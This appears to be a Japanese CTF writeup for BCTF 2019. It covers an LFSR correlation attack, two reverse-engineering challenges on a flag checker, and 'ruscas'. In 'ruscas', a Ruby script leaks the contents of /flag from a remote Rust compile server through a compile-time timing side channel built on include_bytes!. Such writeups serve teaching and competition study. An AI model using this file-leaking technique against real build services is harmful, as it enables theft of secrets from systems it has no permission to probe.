---
date: 2019-06-07T22:46:00.000+09:00
slug: bctf2019-writeup
title: BCTF 2019 Writeup

---

# **trispl**


3 つの LSFR シーケンス r1, r2, r3 から計算される列が与えられるので、r1, r2, r3 の初期状態を求める問題。


### r1 の復元


3 つの LSFR シーケンス r1, r2, r3 の出力と、最終的な出力 output を比較すると次のようになる。


| r1 | r2 | r3 | output |
| -- | -- | -- | ------ |
| 0  | 0  | 0  | 0      |
| 0  | 0  | 1  | 1      |
| 0  | 1  | 0  | 0      |
| 0  | 1  | 1  | 0      |
| 1  | 0  | 0  | 0      |
| 1  | 0  | 1  | 1      |
| 1  | 1  | 0  | 1      |
| 1  | 1  | 1  | 1      |


このことから、「r1 と output が異なる確率」及び「r3 と output が異なる確率」はそれぞれ 1/4 と小さいことが分かる。


ここで、連続する 35 個の出力が全て r1 と一致している確率は $ (4/3) ^ {35} = 4*10^{-5} $ である。入力として与えられているシーケンスの長さは凡そ 10^7 なので十分そのような出力が含まれていることが考えられる。


連続する 35 個の出力が全て r1 と一致しているかどうかは、その情報からそれ以降の出力を計算し、(1/4)程度の誤り率になっていれば、確定することが出来る。


内部状態の復元は LFSR の線形性より連立方程式を解くことで行うことができる。


次のプログラムで 35 個 r1 の出力が連続する位置を出力した。


```c++
#include <iostream>
#include <cstdint>
#include <cassert>
#include <vector>
using namespace std;

// 状態復元用の逆行列
uint64_t inverse_matrix[35] = {14855834710, 6326362903, 22350340756, 31837292004, 17374328966, 16903140071, 12926709806, 8428474302, 30656479327, 7598270616, 28206210189, 26133146437, 11572262149, 22752801792, 26572196304, 1757805169, 13858838719, 33057882531, 14025116904, 15704683167, 22455583310, 16939175584, 6107183295, 3459088519, 21778515376, 18955652974, 2180462431, 4687803056, 15990975814, 8741791755, 10825572773, 3998263332, 24127588885, 13249004473, 16381032056};

struct LSFR {
  uint64_t state, m1, MASK, bits;
  LSFR(uint64_t state, uint64_t m1, int bits): state(state), m1(m1), bits(bits), MASK((1ULL << bits) - 1) {
  };

  int next() {
    uint64_t nstate = (state << 1) & MASK;
    int output = __builtin_popcountll(nstate & m1) & 1;
    state = nstate | output;
    return output;
  }
};

void testLSFR() {
  LSFR l1(191706372, 0b1101011011111000110001000101010111101, 36);
  int expected[96] = {0, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 1, 1, 1, 0, 1, 0, 1, 1, 0, 1, 0, 1, 0, 0, 0, 1, 1, 0, 0, 1, 0, 0, 0, 1, 1, 0, 0, 1, 1, 0, 1, 0, 1, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 1, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 0, 0, 1, 0, 0, 1};
  for (int i = 0; i < 96; i++) {
    assert(l1.next() == expected[i]);
  }
  assert(l1.state == 17763159369);
}

void dfs(const vector<int> &stream, uint64_t state, int pos, int idx, uint64_t mask, uint64_t bits) {
  if (idx == bits - 1) {
    LSFR l1(state, mask, bits);
    for (int i = 0; i < bits - 1; i++) {
      if (l1.next() != stream[i + pos]) {
        cerr << "ERROR" << endl;
      }
      for (int j = 0; j < 10; j++) {
        l1.next();
      }
    }
    double wrong = 0;
    int cnt = 0;
    for (int i = bits - 1 + pos; i < bits - 1 + pos + 1024; i++) {
      if (l1.next() != stream[i]) {
        wrong++;
      }
      cnt++;
      for (int j = 0; j < 10; j++) {
        l1.next();
      }
    }
    if(wrong / cnt < 0.3) { // error rate 0.25
      cout << pos << "," << wrong / cnt << "," << state << endl;
    }
    return;
  }
  int val = stream[pos + idx];

  dfs(stream, state ^ (val ? inverse_matrix[idx] : 0), pos, idx + 1, mask, bits);
}

void solve(const vector<int> &stream, uint64_t mask, uint64_t bits) {
#pragma omp parallel for
  for (uint64_t i = 0 ; i < 10 * 1024 * 1024; i+=1) {
    if (i % 10000 == 0) {
      cout << i << endl;
    }
    dfs(stream, 0, i, 0, mask, bits);
  }
}

const unsigned int N = 10 * 1048576;
uint8_t file_bin[N];

int main() {
  testLSFR();
  FILE *fp = fopen("output", "rb");
  if (fp == nullptr) {
    perror("fopen");
    return 1;
  }
  if (N != fread(file_bin, 1, N, fp)) {
    perror("fread");
    return 1;
  }
  fclose(fp);
  vector<int> stream;
  for(int i = 0; i< N; i++) {
    for (int j = 0; j < 8; j++) {
      stream.push_back(file_bin[i] >> (7 - j) & 1);
    }
  }
  solve(stream, 0b1101011011111000110001000101010111101, 36);
}

```


## r3 の計算


r1 と ouput が異なっている時、r3 と output は確実に一致している。これを元に連立方程式を解くことで r3 の初期状態を求めることができる。


## r2 の復元


r1 と r3 が異なる箇所における r2 の値は output から求めることが出来る。これを元に連立方程式を解くことで r2 の初期状態を求めることができる。


r1 の状態復元用の行列の作成及び、r2, r3 の復元を行うのは以下のプログラムによって行なった。


```python
# coding: utf-8

def lfsr(R, mask, degree):
    nstate = R[0:-1]
    output = vector(GF(2), [0] * (degree - 1))
    for i in xrange(1, degree):
        if mask >> i & 1:
            output += R[i - 1]
    return ([output] + nstate, output)

def conv(vec):
    ret = 0
    for i in xrange(len(list(vec))):
        ret |= int(vec[i]) << i
    return ret

def int_to_vec(val, deg):
    vec = vector(GF(2), [0] * deg)
    for i in xrange(deg):
        vec[i] = (val >> i) & 1
    return vec

degree = 36
mask = 0b1101011011111000110001000101010111101

st = 191706372
vec = int_to_vec(st, degree - 1)

R = []
for i in xrange(degree - 1):
    v = vector(GF(2), [0] * (degree - 1))
    v[i] = 1
    R.append(v)

assert conv(matrix(R)*vec) == st

mat = []
for i in xrange(0, 35):
    R, output = lfsr(R, mask, degree)
    mat.append(output)
    # 10回Skipする
    for j in xrange(0, 10):
        R, output = lfsr(R, mask, degree)
print conv(matrix(R) * vec)
mat = matrix(mat)
print(mat.nrows())
print(mat.ncols())

output = [0, 1, 1, 1, 0, 1, 1, 1, 0, 1, 0, 1, 0, 0, 1, 1, 1, 0, 1, 1, 1, 0, 1, 0, 1, 0, 0, 1, 1, 1, 1, 0, 0, 1, 0, 1, 0, 1, 1, 0, 1, 0, 1, 1, 0, 1, 0, 0, 1, 1, 0, 1, 1, 0, 0, 1, 0, 1, 0, 0, 1, 1, 1, 1, 0, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 1, 1, 0, 1, 0, 0, 1, 1, 0, 1, 1, 0, 1, 1, 1, 1, 1]

output = vector(GF(2), output[0:35])
print mat.rank()
mt = mat.inverse()
outputs = []
for i in xrange(degree - 1):
    r = 0
    for j in xrange(degree - 1):
      r |= int(mt.columns()[i][j])<< j
    outputs.append(r)
print(outputs)
print conv(mat.solve_right(output))

r = 0
for i in xrange(0, 35):
    if output[i]:
        print(outputs[i])
        r ^^= outputs[i]

assert r == 191706372

# 163371,0.257812,22252452503

# read stream
with open('output', 'rb') as f:
    data = f.read()
stream = []
for i in xrange(0, 1024):
    for j in xrange(0, 8):
        stream.append(ord(data[i]) >> (7 - j) & 1)

# r0の復元
if False:
    R = []
    for i in xrange(degree - 1):
        v = vector(GF(2), [0] * (degree - 1))
        v[i] = 1
        R.append(v)

    for i in xrange(0, 163371):
        if i % 1000 == 0:
            print i
        R, output = lfsr(R, mask, degree)
        # 10回Skipする
        for j in xrange(0, 10):
            R, output = lfsr(R, mask, degree)
    vec = int_to_vec(22252452503, degree - 1)
    vec = vector(GF(2), [0] * (degree - 1))
    for i in xrange(0, degree - 1):
        if (22252452503 >> i) & 1:
            vec[i] = 1

    print conv(matrix(R).solve_right(vec))
    sys.exit(0)

# r0の復元結果のチェック
r0 = int_to_vec(24993231789, 35)

R = []
for i in xrange(degree - 1):
    v = vector(GF(2), [0] * (degree - 1))
    v[i] = 1
    R.append(v)
errors = 0
r0_stream = []
for i in xrange(0, 1024 * 8):
    R, output = lfsr(R, mask, degree)
    if output * r0 != stream[i]:
        errors += 1
    r0_stream.append(output * r0)
    # 10回Skipする
    for j in xrange(0, 10):
        R, output = lfsr(R, mask, degree)
# 期待値的に0.25になる
assert errors / 1024.0 / 8 < 0.3

# mask3
print 'solve mask3'
mask3 = 0b10000001101111100011100010001101011101011
degree3 = 40
R = list(MatrixSpace(GF(2), degree3 - 1).one())

mat = []
vec = []
for i in xrange(0, 1024 * 8):
    R, output = lfsr(R, mask3, degree3)
    if stream[i] != r0_stream[i]:
        # 異なる
        # r0 = 0, r1=  0, r1=  1 | r0 = 1, r1 = 0, r2 = 0
        mat.append(output)
        vec.append(1 -  r0_stream[i])
    # 6回Skipする
    for j in xrange(0, 6):
        R, output = lfsr(R, mask3, degree3)
print matrix(mat).rank()

r3 = conv(matrix(mat).solve_right(vector(vec)))
print(r3)

# r3の復元結果のチェック
r3 = int_to_vec(r3, 39)

R = []
for i in xrange(degree3 - 1):
    v = vector(GF(2), [0] * (degree3 - 1))
    v[i] = 1
    R.append(v)
errors = 0
r3_stream = []
for i in xrange(0, 1024 * 8):
    R, output = lfsr(R, mask3, degree3)
    if output * r3 != stream[i]:
        errors += 1
    r3_stream.append(output * r3)
    # 10回Skipする
    for j in xrange(0, 6):
        R, output = lfsr(R, mask3, degree3)
# 期待値的に0.25になる
print(errors)
assert errors / 1024.0 / 8 < 0.3

# r2を復元
print 'solve mask2'
mask2 = 0b110110110100011100001111110110011110111
degree2 = 38
R = list(MatrixSpace(GF(2), degree2 - 1).one())
mat = []
vec = []
for i in xrange(0, 1024):
    R, output = lfsr(R, mask2, degree2)
    if i > 100 and r0_stream[i] != r3_stream[i]: # 先頭の方が信用できないので無視しておく
        if r0_stream[i] == stream[i]:
            vec.append(1)
        else:
            vec.append(0)
        mat.append(output)
    # 6回Skipする
    for j in xrange(0, 4):
        R, output = lfsr(R, mask2, degree2)
print matrix(mat).rank()

r3 = conv(matrix(mat).solve_right(vector(vec)))
print(r3)
```


# ruscas


リモートに Rust のコンパイルを最適化 ON で行なってくれるサーバーがある。
ただし、コンパイル結果やコンパイル時の出力などは表示してくれない。
この条件でフラグファイル(`/flag`)の中身をリークする問題。


Rust はマクロ `include_bytes!` でコンパイル時にファイルの内容を byte 型配列で読み込むことができる。コンパイル結果を得る方法はないので、ファイルの読み込みでコンパイル時間が変わるようにすることを考えた。
Rust では定数の条件分岐の最適化が存在しパスの存在しない関数は削除するため、大きい関数`slow()`を作成して、コンパイル時間を確認することで条件を満たしたかの判断ができるようになった。
後は二部探索してフラグを求めた。


```ruby
require 'ctf'
str = <<EOS
fn slow() {
    %s
}

fn main() {
    let mut ss = include_bytes!("/flag");
    let mut n = 1;
    if ss[%d] >= %d {
        slow();
    } else {
        println!("Fast Path!!");
    }
}
EOS

code = 'let mut vec: Vec<i32> = Vec::new();'
500.times do |i|
    code +="\n" + 'vec[%d] = vec[%d] * 2;' % [i, i]
end
ret = ''
# 事前に同じ方法で二分探索してフラグの長さを特定していた。: 29
29.times do |idx|
    low, high = 32, 126
    while low + 1 < high
        mid = (low + high) / 2
        exploit = str % [code, idx, mid]

        TCPSocket.open(*ARGV) do |s|
            s.expect('"[newline]EOF"')
            exploit.each_line do |c|
                s.puts c
            end
            s.puts "EOF"
            tz= Time.now
            s.expect('Done!')
            diff = Time.now - tz
            if diff > 1
                low = mid
            else
                high = mid
            end
        end
    end
    ret += low.chr
    p ['flag', ret]
end
```


# lut


コンテスト全体の First Blood をこの問題でとった。


バイナリはフラグを入力として読み取り、`flag{16文字の文字列}` というフォーマットになっているかを確認し、8 文字ずつに分割して `enc`関数を呼び出しその結果が特定のものになっているかの確認を行なっている。
ただし、`enc`関数はアセンブリで約 10 万行ある大きな関数で IDA デコンパイラやグラフ表示を利用することは出来なかった。


`enc`関数を読んでみると、入力の k バイト目が x ならば内部領域の y バイト目を z で XOR するという処理の繰り返しで、最後に内部領域を xor しながら reduce して 8byte の整数を生成しているという処理であった。
Ruby でパーサーを書いて処理を簡約した。


```ruby
require 'ctf'


def convert_index(i)

    if i == nil || i == ''
        return 0
    elsif i[0] == '+'
        if i.end_with?('h')
            r = i[1..-2].to_i(16)
            fail unless r % 8 == 0
            return r/8
        else
            r = i[1..-1].to_i(10)
            fail unless r % 8 == 0
            return r/8
        end
        fail i
    else
        fail i
    end
end

def convert_hex(a)
    if a.is_a?(Integer)
        return a
    end
    if a.end_with?('h')
        return a.to_i(16)
    else
        return a.to_i(10)
    end
end
lines = File.read('lut.asm').lines
idx = 0
xors = []
comps = []
while idx < lines.size
    if /mov\s+rax, (.+h)/ =~ lines[idx]
        expected_value = nil
        and_value = $1
        idx += 1
        fail unless /and     rax, \[rbp\+var_818\]/ =~ lines[idx]
        idx += 1
        # testになるパターンと分岐
        if lines[idx].include?('test    rax, rax')
            expected_value = 0
            idx += 1
        else
            fail unless lines[idx].include?('mov     rdx, rax')
            idx += 1
            fail unless /mov\s+rax, (.+h)/ =~ lines[idx]
            expected_value = $1
            idx += 1
            fail unless lines[idx].include?('cmp     rdx, rax')
            idx += 1
        end
        fail unless lines[idx].include?('jnz')
        idx += 1
        fail unless /mov\s+rdx, \[rbp\+s(\+(.+h?))?\]/ =~ lines[idx]
        ofs = $1
        idx += 1
        fail unless /mov\s+rax, (.+h)/ =~ lines[idx]
        idx += 1
        xor_value = $1
        fail unless lines[idx].include?('xor     rax, rdx')
        idx += 1
        fail unless /mov\s+\[rbp\+s(\+(.+h?))?\], rax/ =~ lines[idx]
        idx += 1
        idx += 1 while lines[idx].strip == '' || lines[idx].include?(':')

        comps << [convert_hex(and_value), convert_hex(expected_value), convert_index(ofs), xor_value.to_i(16)]
    elsif /mov     rax, \[rbp\+var_818\]/ =~ lines[idx]
        and_value = nil
        expected_value = nil
        idx += 1
        if lines[idx].include?('movzx   eax, al')
            and_value = 'FFh'
            idx += 1
        else
            fail unless /and     eax, (.+h)/ =~ lines[idx]
            idx += 1
            and_value = $1
        end
        if lines[idx].include?('mov     rdx, rax')
            idx += 1
            fail unless /mov\s+eax, (.+h)/ =~ lines[idx]
            expected_value = $1
            idx += 1
            fail unless lines[idx].include?('cmp     rdx, rax')
            idx += 1
        elsif lines[idx].include?('test    rax, rax')
            expected_value = 0
            idx += 1
        else
            fail unless /cmp     rax, ([0-9a-fA-F]+h?)/ =~ lines[idx]
            idx += 1
            expected_value = $1
        end

        # Copy Paste
        fail unless lines[idx].include?('jnz')
        idx += 1
        fail unless /mov\s+rdx, \[rbp\+s(\+(.+h?))?\]/ =~ lines[idx]
        ofs = $1
        idx += 1
        fail unless /mov\s+rax, (.+h)/ =~ lines[idx]
        idx += 1
        xor_value = $1
        fail unless lines[idx].include?('xor     rax, rdx')
        idx += 1
        fail unless /mov\s+\[rbp\+s(\+(.+h?))?\], rax/ =~ lines[idx]
        idx += 1
        idx += 1 while lines[idx].strip == '' || lines[idx].include?(':')

        comps << [convert_hex(and_value), convert_hex(expected_value), convert_index(ofs), xor_value.to_i(16)]
    elsif lines[idx].include?('mov     rdx, [rbp+s+408h]')
        while true
            if lines[idx].include?('mov     rax, [rbp+s+590h]')
                idx += 1000000000
                break
            end

            fail unless /mov     rdx, \[rbp\+s(.*)\]/ =~ lines[idx]
            first = $1
            idx += 1

            fail unless /mov     rax, \[rbp\+s(.*)\]/ =~ lines[idx]
            second = $1
            idx += 1

            fail unless lines[idx].include?('xor     rax, rdx')
            idx += 1

            fail unless /mov     \[rbp\+s(.*)\], rax/ =~ lines[idx]
            result = $1
            idx += 1
            xors << [convert_index(first), convert_index(second), convert_index(result)]
        end
    else
        STDERR.puts "Unexpected line: #{idx}"
        STDERR.puts lines[idx]
        fail
    end
end

ret = Array.new(256) {|i| 1<<i}
xors.each do |f, s, r|
    fail unless f == r
    ret[r] = ret[f] ^ ret[s]
end
used_bits = ret[178]
p comps.size
comps.reject! do |and_value, expected_value, ofs, xor_value|
    (used_bits >> ofs) & 1 == 0 # 最終結果に影響しない
end
# 同じ場所はマージする
comps = comps.group_by{|a,b,c,d| [a, b]}.map{|k, v| k + [v.map{|vv| vv[3]}.inject(:^)] }
p comps.size

answer = 'abcdefgh'.unpack1("Q")
ret = 0
comps.each do |and_value, expected_value, xor_value|
    if (answer & and_value) == expected_value
        ret ^= xor_value
    end
end
fail unless [ret].pack('Q').unpack1('q') == -5629190975111787065

comps.sort_by!{|a,b|[a,b]}
# create input.txt
File.open('input.txt', 'w') do |f|
    comps.each do |a, b, c|
        len = a.to_s(16).size / 2 - 1
        f.puts "#{len} #{b >> (len * 8)} #{c}"
    end
end


# answer = "N_M!ddL3".unpack1("Q")
answer = "[V]ee7_1".unpack1("Q")
# [V]ee7_1N_M!ddL3
ret = 0
comps.each do |and_value, expected_value, xor_value|
    if (answer & and_value) == expected_value
        ret ^= xor_value
        p ret
    end
end
p ret
```


入力が 8byte なので、4byte 毎に分割しての半分全列挙で問題を解くことが出来る。


# lut revenge


gdb で挙動を観察すると lut と同様に各位置とその値の組毎に XOR する値が決まっていて、目的の値になるような入力を探すという問題であることが分かった。
ただし、入力が 10byte であり半分全列挙は時間的にも空間的にも現実的ではなくなってしまった。


以下のプログラムで、入力と XOR する値の組を作成した 


```text
b *0x0000000000400687
r
x/10ub $rsp
q
```


```ruby
ans = []
16.times do |j|
    256.times do |i|
        f = ("%02x" % 0) * 10
        f[j * 2, 2] = '%02x' % i
        if i != 0
            puts `echo "flag{#{f}}" | gdb -batch -x a ./lut`.lines[3, 2].map{|a|a.split[1..-1]}.flatten.map(&:to_i).join(' ')
        else
            puts 0
        end
        STDOUT.flush
    end
end
```


入力にバックドアがないと解くことは出来ないと考えて、まずは各 byte 位置毎に 2 つの値の組の XOR を取ってみた。すると、その個数は本当にランダムの場合に期待される 256 * 255 / 2 よりもかなり小さく 512 個となった。
さらに検証したところ、各 byte の入力は 9bit のベクトルに対して線形の形で表せることが分かった。8bit ではないので、実際には配列に含まれないデータも表れるが、たかだか 10bit の探索で解を見つけることが出来る。


```python
target = [0xA4, 0xB0, 0xD9, 0x17, 0x46, 0x39, 0x15, 0x00, 0xF8, 0x72]
exp0 = [130, 99, 207, 190, 175, 23, 250, 28, 198, 147]
target = [a ^^ b for a, b in zip(target, exp0)]
target = sum([target[j] * 256 ** j for j in xrange(10)])
target = vector(GF(2), [target>> j & 1 for j in xrange(0, 80)])
with open('input.txt') as f:
    a = map(lambda a: map(int, a.split()), f.readlines())

for i in xrange(0, 256 * 10):
    if i % 256 != 0:
        a[i] = sum([a[i][j] * 256 ** j for j in xrange(10)])
for i in xrange(10):
    a[i * 256] = 0

for i in xrange(0, 256 * 10):
    a[i] = vector(GF(2), [a[i] >> j & 1 for j in xrange(0, 80)])
mat = []
mats = []
for k in xrange(0, 10):
    mat = []
    for j in xrange(0, 256):
        if matrix(mat + [a[j + 256 * k]]).rank() == len(mat) + 1:
            mat.append(a[j + 256 * k])
    # mat = matrix(mat)
    print(matrix(mat)).rank()
    mats += mat
mat = mats
print matrix(mat).rank()
M = matrix(mat).transpose().augment(target)
M = M.rref()
print(M)
undet = []
for j in xrange(0, len(mat)):
    count = 0
    for i in xrange(0, 80):
        if M[i, j] == 1:
            count += 1
    if count != 1:
        undet.append(j)
print(undet)

for i in xrange(0, 2**9):
    answer = [0] * 90
    for j in xrange(9):
        answer[undet[j]] = (i >> j) & 1
    for j in xrange(0, len(mat)):
        count = 0
        target_row = -1
        for k in xrange(0, 80):
            if M[k, j] == 1:
                count += 1
                target_row = k
        if count == 1:
            assert(target_row >= 0)
            for k in xrange(0, 90):
                if k == j:
                    continue
                if M[target_row, k]:
                    assert k in undet
                    answer[j] += answer[k]
            answer[j] += M[target_row, 90]

    print matrix(mat).transpose().solve_right(target)
    print answer
    print matrix(mat).transpose()*vector(answer) == target
    t = []
    v = 0
    v2 = 0
    for j in xrange(0, 10):
        sum = 0
        for k in xrange(0, 9):
            if answer[j * 9 + k]:
                sum += mat[j * 9 + k]
                v2 += mat[j * 9 + k]
        for k in xrange(0, 256 * 10):
            if a[k] == sum:
                t.append(k)
                v += a[k]
                sum = 0
                break
    if len(t) == 10:
        print(t)
    if v == target:
        print(''.join(['%02x' % int(t % 256) for t in t]))
        sys.exit()

    assert v2 == target
    print(t)
# r = 0
# ret = []
# for i in xrange(0, 80):
#     if right[i]:
#         r += mat[i]
#     for j in xrange(0, 10 * 256):
#         if a[j] == r:
#             print i, j
#             if i == 9 or i == 11:
#                 r = 0
#                 ret.append(j)
#             break
# print(ret)
```

